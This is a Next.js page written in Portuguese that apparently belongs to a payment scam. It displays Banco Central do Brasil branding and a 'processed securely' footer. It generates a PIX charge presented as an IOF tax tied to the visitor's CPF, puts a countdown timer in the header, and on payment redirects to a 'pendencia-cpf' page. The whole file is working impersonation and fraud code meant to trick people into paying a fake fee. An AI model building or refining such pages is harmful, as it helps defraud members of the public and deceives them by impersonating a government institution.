"use client"

import { useState, useEffect, Suspense, useRef } from "react"
import { useSearchParams, useRouter } from "next/navigation"
import Image from "next/image"
import { Card } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Copy, CheckCircle, Clock, AlertCircle, Loader2 } from "lucide-react"

interface PixData {
  txid: string
  amount_cents: number
  pix: {
    copia_e_cola: string
    qr_code_base64: string
    expiration: string
  }
}

function LoadingFallback() {
  return (
    <div className="min-h-screen bg-white">
      <header className="bg-[#1a6b8a] text-white p-4 shadow-lg">
        <div className="max-w-4xl mx-auto flex items-center justify-center">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/banco%20central%20logo-xoavR9HTAc4Xvls30hD3pv9OwHAMEC.png"
            unoptimized
            alt="Banco Central"
            width={150}
            height={80}
            className="h-16 w-auto brightness-0 invert"
          />
        </div>
      </header>
      <div className="max-w-lg mx-auto p-4 mt-8">
        <Card className="p-8 text-center bg-white shadow-xl border-0">
          <Loader2 className="w-16 h-16 text-[#4a7fb5] animate-spin mx-auto mb-6" />
          <h2 className="text-2xl font-semibold text-gray-800 mb-2">Gerando pagamento...</h2>
          <p className="text-gray-600">Aguarde enquanto preparamos seu PIX</p>
        </Card>
      </div>
    </div>
  )
}

function PixIOFContent() {
  const searchParams = useSearchParams()
  const router = useRouter()
  const cpf = searchParams.get("cpf") || ""
  const nome = searchParams.get("nome") || ""
  const valor = searchParams.get("valor") || "45.60"
  const valorOriginal = searchParams.get("valorOriginal") || "78.47"

  const [pixData, setPixData] = useState<PixData | null>(null)
  const [isLoading, setIsLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [copied, setCopied] = useState(false)
  const [paymentStatus, setPaymentStatus] = useState<string>("PENDING")
  const [timeLeft, setTimeLeft] = useState<number>(900)
  const isGeneratingRef = useRef(false)

  useEffect(() => {
    if (isGeneratingRef.current || !cpf) {
      if (!cpf) {
        setError("Dados do cliente nao encontrados")
        setIsLoading(false)
      }
      return
    }

    isGeneratingRef.current = true

    const generatePix = async () => {
      setIsLoading(true)
      setError(null)

      try {
        const amountCents = Math.round(parseFloat(valor.replace(",", ".")) * 100)

        const response = await fetch("/api/pix/create", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            amount_cents: amountCents,
            customer_name: nome,
            customer_document: cpf,
            customer_phone: "11999999999",
            description: "IOF - Imposto sobre Operacoes Financeiras",
            external_id: `iof-${cpf.replace(/\D/g, "")}-${Date.now()}`,
          }),
        })

        const data = await response.json()

        if (!data.success) {
          throw new Error(data.error || "Erro ao gerar PIX")
        }

        setPixData(data)
      } catch (err) {
        console.error("Error generating PIX:", err)
        setError(err instanceof Error ? err.message : "Erro ao gerar PIX")
        isGeneratingRef.current = false
      } finally {
        setIsLoading(false)
      }
    }

    generatePix()
  }, [cpf, nome, valor])

  useEffect(() => {
    if (!pixData?.txid) return

    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/pix/status/${pixData.txid}`)
        const data = await response.json()
        
        if (data.success && data.status) {
          setPaymentStatus(data.status)
          if (data.status === "APPROVED") {
            router.push(`/pendencia-cpf?cpf=${cpf}&nome=${encodeURIComponent(nome)}`)
          }
        }
      } catch (err) {
        console.error("Error checking status:", err)
      }
    }

    const interval = setInterval(checkStatus, 5000)
    return () => clearInterval(interval)
  }, [pixData?.txid, cpf, nome, router])

  useEffect(() => {
    if (paymentStatus !== "PENDING") return

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [paymentStatus])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const handleCopy = async () => {
    if (!pixData?.pix.copia_e_cola) return

    try {
      await navigator.clipboard.writeText(pixData.pix.copia_e_cola)
      setCopied(true)
      setTimeout(() => setCopied(false), 3000)
    } catch (err) {
      console.error("Error copying:", err)
    }
  }

  const formatCurrency = (cents: number) => {
    return (cents / 100).toLocaleString("pt-BR", {
      style: "currency",
      currency: "BRL",
    })
  }

  return (
    <div className="min-h-screen bg-white">
      <header className="bg-[#1a6b8a] text-white p-4 shadow-lg">
        <div className="max-w-4xl mx-auto flex items-center justify-between">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/banco%20central%20logo-xoavR9HTAc4Xvls30hD3pv9OwHAMEC.png"
            unoptimized
            alt="Banco Central"
            width={120}
            height={60}
            className="h-12 w-auto brightness-0 invert"
          />
          <div className="flex items-center gap-2 bg-white/20 rounded-full px-3 py-1">
            <Clock className="w-4 h-4" />
            <span className="text-sm font-medium">{formatTime(timeLeft)}</span>
          </div>
        </div>
      </header>

      <div className="max-w-lg mx-auto p-4 mt-4">
        {isLoading ? (
          <Card className="p-8 text-center bg-white shadow-xl border-0">
            <Loader2 className="w-16 h-16 text-[#4a7fb5] animate-spin mx-auto mb-6" />
            <h2 className="text-2xl font-semibold text-gray-800 mb-2">Gerando PIX...</h2>
            <p className="text-gray-600">Aguarde enquanto preparamos seu pagamento</p>
          </Card>
        ) : error ? (
          <Card className="p-8 text-center bg-white shadow-xl border-0">
            <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <AlertCircle className="w-10 h-10 text-red-600" />
            </div>
            <h2 className="text-2xl font-semibold text-gray-800 mb-2">Erro ao gerar PIX</h2>
            <p className="text-gray-600 mb-6">{error}</p>
            <Button onClick={() => { isGeneratingRef.current = false; window.location.reload() }} className="bg-[#4a7fb5] hover:bg-[#3a6fa5] text-white px-8 py-3 text-lg">
              Tentar novamente
            </Button>
          </Card>
        ) : pixData ? (
          <div className="space-y-4">
            <Card className="p-6 bg-white shadow-xl border-0">
              <div className="text-center mb-6">
                <div className="inline-flex items-center gap-2 bg-green-100 text-green-700 px-4 py-2 rounded-full text-sm font-medium mb-4">
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                  PIX gerado com sucesso
                </div>
                <h2 className="text-xl font-bold text-gray-800">Pagamento IOF</h2>
                <p className="text-sm text-gray-500 mt-1">Imposto sobre Operacoes Financeiras</p>
              </div>

              <div className="bg-gradient-to-br from-[#1a6b8a]/10 to-[#4a7fb5]/10 rounded-2xl p-6 mb-6">
                <div className="text-center mb-4">
                  <p className="text-sm text-gray-600 mb-1">Valor do IOF</p>
                  <p className="text-4xl font-bold text-[#1a6b8a]">
                    {formatCurrency(pixData.amount_cents)}
                  </p>
                </div>
              </div>

              <div className="flex justify-center mb-6">
                <div className="bg-white p-4 rounded-2xl border-2 border-[#4a7fb5]/30 shadow-lg">
                  {pixData.pix.qr_code_base64 && (
                    <Image
                      src={pixData.pix.qr_code_base64}
                      alt="QR Code PIX"
                      width={220}
                      height={220}
                      className="w-52 h-52"
                    />
                  )}
                </div>
              </div>

              <div className="text-center mb-4">
                <p className="text-sm text-gray-500">
                  Ou copie o codigo abaixo e cole no seu banco
                </p>
              </div>

              <div className="bg-gray-100 rounded-xl p-4 mb-6">
                <p className="text-xs text-gray-500 mb-2 font-semibold uppercase tracking-wide">Codigo Copia e Cola</p>
                <div className="bg-white rounded-lg border border-gray-200 p-3 break-all text-xs text-gray-700 max-h-20 overflow-y-auto font-mono">
                  {pixData.pix.copia_e_cola}
                </div>
              </div>

              <Button
                onClick={handleCopy}
                className={`w-full py-6 text-lg font-semibold transition-all rounded-xl ${
                  copied
                    ? "bg-green-600 hover:bg-green-700"
                    : "bg-[#4a7fb5] hover:bg-[#3a6fa5]"
                } text-white shadow-lg`}
              >
                {copied ? (
                  <>
                    <CheckCircle className="w-6 h-6 mr-2" />
                    Codigo copiado!
                  </>
                ) : (
                  <>
                    <Copy className="w-6 h-6 mr-2" />
                    Copiar codigo PIX
                  </>
                )}
              </Button>
            </Card>

            <div className="text-center text-xs text-gray-400 pb-6">
              <p className="font-medium">Pagamento processado com seguranca</p>
              <p>Banco Central do Brasil</p>
            </div>
          </div>
        ) : null}
      </div>
    </div>
  )
}

export default function PixIOFPage() {
  return (
    <Suspense fallback={<LoadingFallback />}>
      <PixIOFContent />
    </Suspense>
  )
}
